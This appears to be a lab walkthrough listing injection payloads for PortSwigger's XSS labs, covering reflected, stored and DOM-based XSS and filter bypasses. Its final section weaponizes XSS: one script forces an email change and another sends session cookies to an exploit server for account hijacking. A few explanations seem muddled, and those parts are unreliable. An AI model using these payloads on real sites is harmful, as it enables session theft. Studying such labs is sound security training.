# Cross-Site Scripting (XSS): Lab Scripts & Walkthroughs
Scope: PortSwigger Web Security Academy, "Cross-site scripting" topic.
https://portswigger.net/web-security/all-labs#cross-site-scripting

**Filter applied:** every lab below is solvable with just a free Web Security Academy
account + a browser (and optionally free Burp Suite Community Edition for fuzzing). Labs
that explicitly require **Burp Collaborator's external-interaction workflow** for their
*primary* solution path are called out separately at the end and excluded from the main
list, per your request. All PortSwigger Academy labs themselves are free — the exclusion
here is specifically about the Collaborator-dependent solution path, not account cost.

Each lab: goal → payload → where to put it. All labs are reachable via
"Access it via" → "View all XSS labs" on the topic page, or by lab title search.

---

## A. Reflected XSS

### A1. Reflected XSS into HTML context with nothing encoded — APPRENTICE
**Goal:** call `alert()` via the search box.
```
<script>alert(1)</script>
```
Paste into the search field and submit.

### A2. Reflected XSS into attribute with angle brackets HTML-encoded: APPRENTICE
**Goal:** payload reflects inside a `value="..."` attribute; `<`/`>` are encoded.
```
" autofocus onfocus=alert(1) x="
```
Break out of the attribute with `"`, add a self-triggering event handler.

### A3. Reflected XSS into a JavaScript string with angle brackets HTML encoded: APPRENTICE
**Goal:** payload lands inside `var searchTerm = 'HERE';`.
```
'-alert(1)-'
```
or
```
';alert(1)//
```

### A4. Reflected XSS into HTML context with most tags and attributes blocked: PRACTITIONER
**Goal:** filter strips most tags/attrs (`onerror`, `<script>`, etc. blocked).
```
<body onresize=alert(1)>
```
Then in the address bar / via the "resize" trick (or use the technique below), trigger a
resize. Simpler: use the SVG animate technique which the filter usually misses:
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### A5. Reflected XSS into HTML context with all tags blocked except custom ones: PRACTITIONER
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```
Host this on the lab's built-in exploit server, then deliver it to yourself (or use "view
exploit" against your own session to confirm, then deliver to the victim if the lab asks
for full exploitation).

### A6. Reflected XSS with some SVG markup allowed: PRACTITIONER
```
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### A7. Reflected XSS in canonical link tag: PRACTITIONER (requires Firefox)
Injection point is a `<link rel=canonical href="HERE">` tag added via a header. Break out
of the attribute:
```
'accesskey='x'onclick='alert(1)
```
Firefox lets you trigger `accesskey` via Alt+Shift+X (or Shift+Alt+X depending on OS).

### A8. Reflected XSS into a JavaScript string with single quote and backslash escaped: PRACTITIONER
Backslash before your `'` is auto-escaped, so you can't close the string with `'`. Instead
terminate the `<script>` tag itself:
```
</script><script>alert(1)</script>
```

### A9. Reflected XSS into a JavaScript string with angle brackets and double quotes
HTML-encoded and single quotes escaped — PRACTITIONER
Since both the tag-break and the string-break routes are blocked individually, combine an
encoded exploit-server redirect that changes context, or use the multi-byte/backslash trick:
```
\';alert(1)//
```
(if the app naively escapes `'` → `\'`, sending a literal backslash first turns their escape
character into a harmless literal, freeing your own `'`).

### A10. Reflected XSS with event handlers and `href` attributes blocked: PRACTITIONER
Filter strips `on*` attributes and `href`. Use an SVG animate vector instead:
```
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## B. Stored XSS

### B1. Stored XSS into HTML context with nothing encoded: APPRENTICE
Post a blog comment containing:
```
<script>alert(1)</script>
```

### B2. Stored XSS into anchor `href` attribute with double quotes HTML-encoded: APPRENTICE
Website field reflects into `<a href="HERE">`, quotes are encoded so you can't add a new
attribute — but the URL scheme itself is still yours:
```
javascript:alert(1)
```
Save, then click the resulting link/avatar on the comment.

### B3. Stored XSS into HTML context with most tags and attributes blocked — PRACTITIONER
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### B4. Stored XSS into HTML context with all tags blocked except custom ones: PRACTITIONER
```
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```
Then browse to the comment page with `#x` appended to the URL so the element auto-focuses,
or click near it to focus manually.

### B5. Stored XSS into `onclick` event with angle brackets, double quotes HTML-encoded
and single quotes/backslash escaped — PRACTITIONER
Injection lands inside `onclick="var name='HERE'"`. Backslash-escaping blocks a direct `'`
break; instead inject something that doesn't need a quote:
```
x');alert(1)//
```
(where the surrounding code is `func('` + your input + `')` — supply a payload that closes
the call cleanly without needing an un-escaped quote character, adjusting to the exact
reflected structure shown in the page source).

### B6. Stored XSS into anchor `href` attribute with double quotes HTML-encoded and
JavaScript URL blocked — PRACTITIONER
`javascript:` is blocked/stripped. Bypass by breaking case/whitespace filters or use a
data: URL variant the filter misses, e.g.:
```
javascript&colon;alert(1)
```
or (case bypass on naive blacklists):
```
JaVaScRiPt:alert(1)
```

---

## C. DOM-based XSS

For all of these, submit the payload as the relevant URL parameter (query string or hash)
and load the resulting URL.

### C1. DOM XSS in `document.write` sink using source `location.search`: APPRENTICE
```
?search=<img src=1 onerror=alert(1)>
```

### C2. DOM XSS in `innerHTML` sink using source `location.search`: APPRENTICE
```
?search=<img src=1 onerror=alert(1)>
```

### C3. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source: APPRENTICE
```
?returnPath=javascript:alert(document.cookie)
```

### C4. DOM XSS in jQuery selector sink using a `hashchange` event: APPRENTICE
```
https://YOUR-LAB-ID.web-security-academy.net/#<img src=1 onerror=alert(1)>
```
Trigger a hashchange by loading the page then re-navigating (or use `<iframe>` + JS `onload`
that changes `location.hash` twice).

### C5. DOM XSS in AngularJS expression with angle brackets and double quotes
HTML-encoded: PRACTITIONER
```
{{$on.constructor('alert(1)')()}}
```
(exact AngularJS-sandbox-escape string may need to match the version in the lab — pull the
current one from the live cheat sheet's AngularJS filter if this specific string fails).

### C6. Reflected DOM XSS: PRACTITIONER
Data flows: URL param → server reflects into a JSON blob → client JS `eval()`s it. Payload
needs to close out of the JSON string and the `eval` context:
```
\"-alert(1)}//
```

### C7. Stored DOM XSS: PRACTITIONER
Comment "website" field is stored, then later read via `innerHTML` by client JS.
```
"><img src=1 onerror=alert(1)>
```

### C8. DOM XSS in `document.write` sink using source `location.search` inside a
`select` element — PRACTITIONER
Injection lands inside a `<select><option>HERE</option></select>` written via `document.write`.
```
</select><img src=1 onerror=alert(1)>
```

### C9. DOM-based XSS using web messages: PRACTITIONER
Page's `message` event handler writes attacker data into the DOM with no origin check. Host
on the lab's exploit server:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
```

### C10. DOM-based XSS using web messages and a JavaScript URL: PRACTITIONER
Handler takes posted data and assigns it to `location`:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)','*')">
```

### C11. Exploiting DOM clobbering to enable XSS: PRACTITIONER
Page reads a config object off the DOM (e.g. `window.someLibrary.defaultAvatar`) that isn't
initialized if a certain script fails to load; you can "clobber" it by injecting HTML that
defines global names via `id`/`name` attributes:
```html
<a id=someLibrary><a id=someLibrary name=defaultAvatar href="javascript:alert(1)">
```

---

## D. Exploiting XSS (post-detection weaponization)

### D1. Exploiting XSS to perform CSRF: PRACTITIONER
Uses the vulnerable comment form's stored/reflected XSS to submit a state-changing request
(e.g. "change email") using the victim's live session, no Collaborator needed, everything
happens client-side once your script runs in the victim's browser:
```html
<script>
  document.location='https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@evil.com';
</script>
```
Host on the exploit server and "deliver to victim" from the lab UI.

### D2. Exploiting cross-site scripting to steal cookies: PRACTITIONER
Uses the lab's own exploit server as the collection point (not Collaborator):
```html
<script>
  document.location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?c='+document.cookie;
</script>
```
Store this as a blog comment, deliver to the victim, then check the exploit server's access
log for the leaked `session=` cookie value and use it to hijack the account (e.g. via a
cookie-editing browser extension or Burp's Proxy match/replace).

---

